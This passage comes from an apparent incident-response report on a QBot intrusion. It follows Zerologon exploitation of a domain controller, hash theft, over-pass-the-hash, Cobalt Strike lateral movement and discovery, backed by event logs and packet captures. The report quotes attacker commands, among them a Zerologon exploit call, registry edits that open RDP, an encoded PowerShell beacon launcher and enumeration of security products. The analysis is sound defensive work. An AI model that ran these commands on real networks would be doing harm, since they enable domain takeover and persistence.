CommandLine: C:\\Windows\\system32\\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c \"taskkill /f /im explorer.exe\"\n  CurrentDirectory:\n```\n\nThree milliseconds after the Zerologon exploit, an event 4742 “A computer account was changed.” was generated on the targeted Domain Controller.\n\nAs explained in a detailed blog from CrowdStrike, the ZeroLogon CVE relies on the AES-CFB8 algorithm used with a zero IV:\n\n> “In order to use AES-CFB8 securely, a random initialization vector (IV) needs to be generated for every plaintext to be encrypted using the same key. However, the ComputeNetlogonCredential function sets the IV to a fixed value of 16 zero bytes. This results in a cryptographic flaw in which encryption of 8-bytes of zeros could yield a ciphertext of zeros with a probability of 1 in 256. Another implementation issue that allows this attack is that unencrypted Netlogon sessions aren’t rejected by servers (by default). The combination of these two flaws could allow an attacker to completely compromise the authentication, and thus to impersonate a server of their choice.”\n\nAs we can see on the network captures, a brute-force attack was performed in order to spoof the identity of the domain controller:\n\n```image\nAlt: Brute Force\nDescription: The image depicts network traffic logs related to the RPC_NETLOGON protocol. It shows multiple entries for authentication requests and responses, particularly noting 'STATUS_ACCESS_DENIED' for several attempts, indicating failed authentication attempts. Some lines highlight issues such as 'TCP Spurious Retransmission' and 'TCP Previous segment not captured,' which suggest network anomalies. The overall context is related to a brute-force attack scenario where access to the Domain Controller is being attempted.\nTranscription: |\n  Protocol          Info\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Spurious Retransmission] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      [TCP Previous segment not captured] NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n  RPC_NETLOGON      NetrServerReqChallenge response\n  RPC_NETLOGON      NetrServerAuthenticate2 response, STATUS_ACCESS_DENIED\n```\n\nAfter the end of the brute force traffic, we can see a single instance where the exploit has completed successfully.\n\n```image\nAlt: Exploit Success\nDescription: The image displays a network packet capture from a cybersecurity analysis tool. It shows a single frame containing detailed information about a malformed packet related to the Microsoft Network Logon protocol. Key aspects include the Ethernet II source and destination ports, the operation type (NetrServerPasswordSet2), and the timestamp, which appears incorrectly set to 'Dec 31, 1969'. The report also highlights an error indicating a malformed packet, with an associated error level marked as 'Error' and a severity level of 'Error', suggesting that there was an exception during packet processing.\nTranscription: |\n  Frame 938101: 94 bytes on wire (752 bits), 94 bytes captured (752 bits)\n  Ethernet II, Src:\n  Internet Protocol\n  Transmission Control Protocol, Src Port: 49675, Dst Port: 61579, Ack: 41675, Len: 40\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Response, Fragment: Single, FragLen: 40, Call: 548, Ctx: 0, [Req: #938017]\n  Microsoft Network Logon, NetrServerPasswordSet2 (30)\n      Request in frame: 938017\n      AUTHENTICATOR: return_authenticator\n          Referent ID: 0xdd55e901\n          Credential: 080ade8600000000\n          Timestamp: (0)Dec 31, 1969 19:00:00.000000000 EST\n  [Malformed Packet: RPC_NETLOGON]\n      [Expert Info (Error/Malformed): Malformed Packet (Exception occurred)]\n      [Malformed Packet (Exception occurred)]\n      [Severity level: Error]\n      [Group: Malformed]\n```\n\nAfter being successfully authenticated, the DC password was set:\n\n```image\nAlt: DC Password\nDescription: The image is a screenshot of an XML log entry from Microsoft Windows security auditing. It contains detailed information about a security event identified by Event ID 4742, which indicates that a computer account was changed. Key data points include the target username, target domain name, subject username ('ANONYMOUS LOGON'), and the timestamp of the event. The XML structure delineates various attributes associated with the event, providing a technical overview of the changes made to the computer account.\nTranscription: |\n  <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\">\n    <System>\n      <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-a5ba-3e3b0328c30d}\"/>\n      <EventID>4742</EventID>\n      <Version>0</Version>\n      <Level>0</Level>\n      <Task>13825</Task>\n      <Opcode>0</Opcode>\n      <Keywords>0x8020000000000000</Keywords>\n      <TimeCreated SystemTime=\"T17:03:25.2463168Z\"/>\n      <EventRecordID>13249</EventRecordID>\n      <Execution ProcessID=\"644\" ThreadID=\"224\"/>\n      <Channel>Security</Channel>\n      <Computer>...</Computer>\n    </System>\n    <EventData>\n      <Data Name=\"ComputerAccountChange\">...</Data>\n      <Data Name=\"TargetUserName\">...</Data>\n      <Data Name=\"TargetDomainName\">...</Data>\n      <Data Name=\"TargetSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserSid\">S-1-5-7</Data>\n      <Data Name=\"SubjectUserName\">ANONYMOUS LOGON</Data>\n      <Data Name=\"SubjectDomainName\">NT AUTHORITY</Data>\n      <Data Name=\"PrivilegeList\">...</Data>\n      <Data Name=\"SubjectLogonId\">0x3e6</Data>\n      <Data Name=\"SamAccountName\">...</Data>\n      <Data Name=\"DisplayName\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"HomePath\">...</Data>\n      <Data Name=\"ScriptPath\">...</Data>\n      <Data Name=\"ProfilePath\">...</Data>\n      <Data Name=\"UserWorkstations\">...</Data>\n      <Data Name=\"PasswordLastSet\">5:03:25 PM</Data>\n      <Data Name=\"UserAccountExpires\">...</Data>\n      <Data Name=\"PrimaryGroupId\">...</Data>\n      <Data Name=\"HomeDirectory\">...</Data>\n      <Data Name=\"OldValue\">...</Data>\n      <Data Name=\"UserAccountControl\">...</Data>\n      <Data Name=\"SidHistory\">...</Data>\n      <Data Name=\"LogonHours\">...</Data>\n      <Data Name=\"DnsHostName\">...</Data>\n      <Data Name=\"ServicePrincipalNames\">...</Data>\n    </EventData>\n  </Event>\n```\n\nThe `PasswordLastSet` field is equal to the `TimeCreated` field, meaning that the password of the domain controller was successfully updated. We can also see that the `SubjectUserName` is `ANONYMOUS LOGON`.\n\nA connection was performed from the beachhead to the Domain Controller using the DC account. After authenticating to the DC with the DC account, the threat actors dumped the Domain Admin hash, and then reset the DC password in order to unbreak the Active Directory Domain.\n\n```image\nAlt: Domain Admin Hash\nDescription: The image displays a Windows Event Log entry (Event 7045) from the Service Control Manager. It provides details about a service that was installed on the system. The log includes the following key information: the service name 'LMMCP00MEDEFHBDAMBML', the service file name which is a PowerShell command to reset the computer's machine password, the service type classified as a user mode service, the service start type labeled as 'demand start', and the service account specified as 'LocalSystem'. This information is relevant for analyzing potential unauthorized service installations and security breaches.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  General\n  Details\n  \n  A service was installed in the system.\n  Service Name: LMMCPOOMEDEFHBDAAMBML\n  Service File Name: powershell.exe -c Reset-ComputerMachinePassword\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\nThe explorer shell was also restarted by the threat actor:\n\n```image\nAlt: Explorer Restart\nDescription: The image displays a Windows Event Viewer screenshot showing Event ID 7045, which indicates that a new service was installed on the system. It includes details such as the service name (ANFDHCOCLIICFDIPINAD), the service file name (a command to execute ‘taskkill’), the service type (user mode service), the start type (demand start), and the service account (LocalSystem). This information is relevant in the context of monitoring system changes and potential malicious activities.\nTranscription: |\n  Event 7045, Service Control Manager\n  \n  A service was installed in the system.\n  Service Name: ANFDHCOCLIICFDIPINAD\n  Service File Name: %COMSPEC% /C \"taskkill /f /im explorer.exe\"\n  Service Type: user mode service\n  Service Start Type: demand start\n  Service Account: LocalSystem\n```\n\n### Defense Evasion\n\nUpon execution of the initial DLL, QBot uses process hollowing to start a suspended instance of explorer.exe (32-bit) and then injects itself into this process.\n\n```image\nAlt: Process Hollowing\nDescription: The image displays a log entry related to a security event in a Windows environment. It includes various fields such as LogName, EventCode, EventType, ComputerName, SourceName, and details about the process creation event. Key information includes the Creator Subject's Security ID and Logon ID, the Target Subject's Security ID, and the Process Information detailing the New Process ID, New Process Name, and Command Line. This log entry specifically indicates that a new process has been created, providing insight into potential suspicious activity related to process creation.\nTranscription: |\n  LogName=Security\n  EventCode=4688\n  EventType=0\n  ComputerName=\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=38250\n  Keywords=Audit Success\n  TaskCategory=Process Creation\n  OpCode=Info\n  Message=A new process has been created.\n  \n  Creator Subject:\n      Security ID:\n      Account Name:\n      Account Domain:\n      Logon ID: 0x741A48\n  \n  Target Subject:\n      Security ID: S-1-0-0\n      Account Name: -\n      Account Domain: -\n      Logon ID: 0x0\n  \n  Process Information:\n      New Process ID: 0x1958\n      New Process Name: C:\\Windows\\SysWOW64\\explorer.exe\n      Token Elevation Type: %%1936\n      Mandatory Label: S-1-16-8192\n      Creator Process ID: 0x32b4\n      Creator Process Name: C:\\Windows\\SysWOW64\\rundll32.exe\n      Process Command Line: C:\\Windows\\SysWOW64\\explorer.exe\n```\n\nThe injected explorer.exe process was used to spawn and inject into additional instances of explorer.exe (32-bit). An example event can be seen below. Source PID 10492 belonging to QBot, injected a DLL into PID 4072 which we discovered was part of Cobalt Strike C2 communication.\n\n```image\nAlt: Cobalt Strike Communication\nDescription: The image displays a log entry from the Microsoft Windows Sysmon (System Monitor) detailing a process access event. It includes various information fields such as EventCode, EventType, ComputerName, and specifics about the Source and Target processes involved in a Dynamic-link Library (DLL) injection technique. Key details highlighted include SourceProcessId (10492) and TargetProcessId (4072), both referencing instances of explorer.exe. The log also mentions the technique ID (T1055.001), indicating that this relates to process injection methods, which is relevant to cyber threat intelligence.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=10\n  EventType=4\n  ComputerName=DESKTOP-XXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=38015\n  Keywords=None\n  TaskCategory=Process accessed (rule: ProcessAccess)\n  OpCode=Info\n  Message=Process accessed:\n  RuleName: technique_id=T1055.001, technique_name=Dynamic-link Library Injection\n  UtcTime: [REDACTED]\n  SourceProcessGUID: {6634681a-8d6d-6192-3312-000000000500}\n  SourceProcessId: 10492\n  SourceThreadId: 11956\n  SourceImage: C:\\Windows\\SysWOW64\\explorer.exe\n  TargetProcessGUID: {6634681a-9429-6192-c412-000000000500}\n  TargetProcessId: 4072\n  TargetImage: C:\\Windows\\SysWOW64\\explorer.exe\n  GrantedAccess: 0x1FFFFF\n```\n\n#### Over-Pass-the-Hash from Beachhead\n\nThe threat actor obtained the NTLM hash value of the administrator account through the Zerologon exploit and used over-pass-the-hash to request a TGT from the domain controller. We have seen the use of over-pass-the-hash several times before. For example, our Cobalt Strike Defender Guide covers detection of this technique in more detail.\n\n```image\nAlt: Over-Pass-the-Hash\nDescription: The image displays the properties of a security event (Event ID 4624) from a Microsoft Windows security auditing log. It details a successful logon event, including information such as the Security ID, Account Name, Logon Type, and Process Information. The log outlines the account that was logged on, the associated security identifiers, and details about the logon process, including the source address and the authentication package used.\nTranscription: |\n  Event Properties - Event 4624, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  An account was successfully logged on.\n  \n  Subject:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39D591C\n  \n  Logon Information:\n    Logon Type: 9\n    Restricted Admin Mode: -\n    Virtual Account: No\n    Elevated Token: No\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n    Security ID: S-1-5-21-853439379-3680187918-914098032-1115\n    Account Name:\n    Account Domain:\n    Logon ID: 0x39E88DB\n    Linked Logon ID: 0x0\n    Network Account Name: Administrator\n    Network Account Domain:\n    Logon GUID: {00000000-0000-0000-0000-000000000000}\n  \n  Process Information:\n    Process ID: 0xaf4\n    Process Name: C:\\Windows\\System32\\svchost.exe\n  \n  Network Information:\n    Workstation Name:\n    Source Network Address: ::1\n    Source Port: 0\n  \n  Detailed Authentication Information:\n    Logon Process: seclog\n    Authentication Package: Negotiate\n    Transited Services:\n    Package Name (NTLM only): -\n    Key Length: 0\n```\n\nSoon after, a TGT for the administrator account was requested:\n\n```image\nAlt: TGT Request\nDescription: The image displays a screenshot of the Event Properties for Event ID 4768, indicating a request for a Kerberos authentication ticket (TGT). It contains detailed information about the account making the request (Administrator), the service involved (krbtgt), and the associated network information including client address and port. Additional details on ticket options, result code, ticket encryption type, and pre-authentication type are also provided, making it a relevant and informative resource for analyzing authentication requests in a cybersecurity context.\nTranscription: |\n  Event Properties - Event 4768, Microsoft Windows security auditing.\n  \n  General\n  Details\n  \n  A Kerberos authentication ticket (TGT) was requested.\n  \n  Account Information:\n  - Account Name: Administrator\n  - Supplied Realm Name:\n  - User ID: S-1-5-21-853439379-3680187918-914098032-500\n  \n  Service Information:\n  - Service Name: krbtgt\n  - Service ID: S-1-5-21-853439379-3680187918-914098032-502\n  \n  Network Information:\n  - Client Address: :::ffff:10.155.25.134\n  - Client Port: 61689\n  \n  Additional Information:\n  - Ticket Options: 0x40810010\n  - Result Code: 0x0\n  - Ticket Encryption Type: 0x12\n  - Pre-Authentication Type: 2\n  \n  Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n```\n\n### Discovery\n\nQBot initially starts a number of processes to collect information about the affected system. This is part of the “SYSTEM INFO” bot request, as described in a recent article from SecureList.\n\n```image\nAlt: System Info\nDescription: The image displays a table containing data related to system commands executed during a cybersecurity event. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory,' listing various commands such as 'whoami /all,' 'ipconfig /all,' and 'nslookup.' Each command is associated with the 'explorer.exe' process, indicating that these commands are part of the discovery phase in a potential attack, reflecting the operational tactics used to gather information about the affected system and network.\nTranscription: |\n  | ParentImage         | CommandLine                                              | TaskCategory                         |\n  | ------------------- | -------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64 | whoami /all                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | cmd /c set                                               | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | ipconfig /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net view /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdc. | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net share                                                | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | route print                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | netstat -nao                                             | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net localgroup                                           | Process Create (rule: ProcessCreate) |\n```\n\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n\n```image\nAlt: Active Directory Discovery\nDescription: The image depicts a table detailing command-line activities related to process creation on a Windows system. It includes columns for 'ParentImage', 'CommandLine', and 'TaskCategory', showing various commands executed, such as retrieving group information from a domain and executing a ping command. This information is relevant for understanding the investigative steps taken during a cybersecurity incident involving QBot.\nTranscription: |\n  | ParentImage                      | CommandLine                                                                               | TaskCategory                         |\n  | -------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain admins\" /domain                                                         | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain controllers\" /domain                                                    | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C ping -n 1                                                  | Process Create (rule: ProcessCreate) |\n```\n\n#### ADFind (renamed in find.exe) used to enumerate computers\n\n```\nC:\\redacted\\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\n```image\nAlt: ADFind\nDescription: The image displays technical information about the tool 'find.exe', which is known as AdFind. It includes details such as the file version (1.52.0.5064), product name (AdFind), company (www.joeware.net), original file name (AdFind.exe), and the command line used to execute the tool. The command line demonstrates how the tool is utilized to enumerate computer objects in an Active Directory environment, specifically fetching attributes like name, common name (cn), operating system, and DNS host name in CSV format.\nTranscription: |\n  Image:                find.exe\n  FileVersion:          1.52.0.5064\n  Description:          -\n  Product:              AdFind\n  Company:              www.joeware.net\n  OriginalFileName:     AdFind.exe\n  CommandLine:          C:\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\n\n```image\nAlt: WMI Query\nDescription: The image displays a table containing process creation logs related to a Windows environment. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory.' The 'ParentImage' column indicates the use of PowerShell, while the 'CommandLine' column shows various commands executed via cmd.exe to query security software components using Windows Management Instrumentation (WMI). The 'TaskCategory' column specifies that these actions are categorized as 'Process Create.' This data is relevant for understanding the actions taken by threat actors during a domain compromise.\nTranscription: |\n  | ParentImage                                               | CommandLine                                                                                              | TaskCategory                         |\n  | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value   | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value    | Process Create (rule: ProcessCreate) |\n```\n\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value\n```\n\n#### Ping was used to verify machines were online\n\n```\nping -n 1 [REDACTED]\n```\n\n### Lateral Movement\n\nThrough the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.\n\n```\nEventCode: 7045\nService File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>\nUser: NT AUTHORITY\\SYSTEM\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n```\n\nOn the first Domain Controller, a Cobalt Strike service was installed:\n\n```image\nAlt: Cobalt Strike Service\nDescription: The image displays a Windows Event Log entry with details about a service installation related to a Cobalt Strike operation. Key information includes the EventCode (7045), indicating a service was installed, the Service File Name which shows the command executed (including PowerShell and an encoded command), the User account under which the service was created (LocalSystem), and other attributes like the ComputerName and types of the service. This log entry is crucial for understanding the lateral movement of malware in a network.\nTranscription: |\n  LogName: System\n  EventCode: 7045\n  EventType: 4\n  ComputerName: <redacted>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-Service Control Manager\n  Type: Information\n  RecordNumber: 2730\n  TaskCategory: None\n  OpCode: The operation completed successfully.\n  Message: A service was installed in the system.\n  \n  Service Name: af5ff02\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADOATgB1AHcALQBpAGMAdABlAG8AQgB5AFMAZABhAGUAYQBuAGQAYQAgAGUAbgB0AGUAcgB0AGUAcgB0AGUAcgB0AGUAcgB...\n```\n\n```\nLog Source: Microsoft-Windows-Service Control Manager Event ID:7045\n```\n\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\n\n```\nHKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath\n```\n\nCobalt Strike first calls `OpenSCManagerW` to create the service remotely, then starts it with `StartServiceA` function:\n\n```image\nAlt: Service Creation\nDescription: The image displays a network packet capture related to the execution of the `OpenSCManagerW` and `StartServiceA` functions, which are part of the Cobalt Strike malware's lateral movement technique. The upper part shows timestamps, source, and destination ports, indicating communication between a compromised host and a domain controller. The lower part provides detailed information about the captured frame, including frame size, Ethernet II details, and the Internet Protocol version 4 data. This image contains technical details pertinent to cyber threat analysis.\nTranscription: |\n  Frame 1306464: 194 bytes on wire (1552 bits), 194 bytes captured (1552 bits)\n  Ethernet II, Src: <redacted>, Dst: <redacted>\n  Internet Protocol Version 4, Src: BeachHead IP, Dst: DC IP\n  Transmission Control Protocol, Src Port: 61768, Dst Port: 49729, Seq: 14613, Ack: 679, Len: 140\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Request, Fragment: Single, Fragment Offset: 0\n  ```\n  \n  ```\n  17:15:47.907308 61768 SVCCtl OpenSCManagerW request\n  17:15:47.908686 49729 SVCCtl OpenSCManagerW response\n  17:15:47.914445 49729 SVCCtl Unknown operation 60 response\n  17:15:47.915546 61768 SVCCtl StartServiceA request\n  17:15:48.031885 49729 SVCCtl StartServiceA response\n```\n\n#### RDP/interactive Logins\n\nVarious commands were executed to enable the RDP service on various hosts:\n\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f\n```\n\nMakes sure the RDP listener is enabled.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f\n```\n\nMakes sure the user is allowed to RDP to the terminal server.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f\n```\n\nMakes sure the terminal server is set to enabled.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f\n```\n\nMakes sure terminal services is set to remote admin mode.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f\n```\n\nMakes sure that the terminal service will start idle sessions.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f\n```\n\nEnables advertisement of the terminal server.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f\n```\n\nMakes sure terminal server is set to allow connections.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f\n```\n\nMakes sure terminal server is set to simultaneous sessions.\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f\n```\n\nStarts the terminal services and sets service to autostart.\n\n```\nsc config termservice start= auto\nnet  start termservice /y\n```\n\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a detailed security log entry from a Windows environment, indicating a successful logon event (EventCode=4624) related to Remote Desktop Protocol (RDP). It includes specific logon information such as the security ID, account name, account domain, logon type, and process information. The log indicates that an account was successfully logged on, with notable details about the administrator account used, including its security ID, logon ID, and the process associated with the logon (svchost.exe). This log serves as a crucial piece of information in the context of lateral movement and potential domain compromise scenarios.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=************\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=12572\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID: S-1-5-18\n      Account Name: ************\n      Account Domain: ************\n      Logon ID: 0x3E7\n  \n  Logon Information:\n      Logon Type: 10\n      Restricted Admin Mode: No\n      Virtual Account: No\n      Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n      Security ID: S-1-5-21-853439379-3680187918-914908032-500\n      Account Name: Administrator\n      Account Domain: ************\n      Logon ID: 0x1213E97\n      Linked Logon ID: 0x0\n      Network Account Name: -\n      Network Account Domain: -\n      Logon GUID: {56eb6b07-4091-d736-d28e-f8ef8d0dc9158}\n  \n  Process Information:\n      Process ID: 0x3c\n      Process Name: C:\\Windows\\System32\\svchost.exe\n```\n\n```\nLogName=Security\nEventCode=4624\nLogon Type=10 (Remote Interactive Logon - RDP)\n```\n\n### Named pipe (SMB)\n\nThe base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe “dce_3d”.\n\n```image\nAlt: SMB Beacon\nDescription: The image shows the output of a CyberChef operation, displaying a base64 decoded payload. The highlighted portion indicates the creation of a named pipe named \"dce_3d\". The surrounding text contains garbled data, typical of decoded binary payloads, potentially representing an SMB beacon.\nTranscription: |\n  üè....`à1òd.R0.R..R.r( .J&1y1A¬<a|, ÁÏ\n  ,ÇàRW.R..B<.D.@x.AtJ.DP.H..X .óá<1.4..Ó1y1¬ÁÍ\n  .Cçàu0.j; }$uÀ.xS.6f.K.x..ó...D.$$$[[ayZQyàX_Z..ë.1]Àj@h....hyÿ..j.hX¤SâyÖPé´...z1éQqh.°..h..°j.j.RhEpÔyÖP..$i.Rh(o)áyÖ.Atnj.j.j..æ.Æ..Â.|$..9At.hòµçVyÖyd$.èsyÿ\\\\.\\pipe\\dce_3d .i .\n```\n\n```image\nAlt: Named Pipe\nDescription: The image displays a log entry related to the creation of a named pipe in a Windows environment. It contains various fields such as LogName, EventCode, ComputerName, User, and more, with specific values indicating the details of the event. Notably, it shows that a pipe named '\\dce_3d' was created by a process with ID 396, which is associated with PowerShell. The log entry format is typical for Windows event logs, providing crucial information for cybersecurity analysis.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=17\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=43747\n  Keywords=None\n  TaskCategory=Pipe Created (rule: PipeEvent)\n  OpCode=Info\n  Message=Pipe Created:\n  RuleName=-\n  EventType=CreatePipe\n  UtcTime=\n  ProcessGuid={3acf9a2a-953e-6192-cd20-00000000000300}\n  ProcessId=396\n  PipeName=\\dce_3d\n  Image: 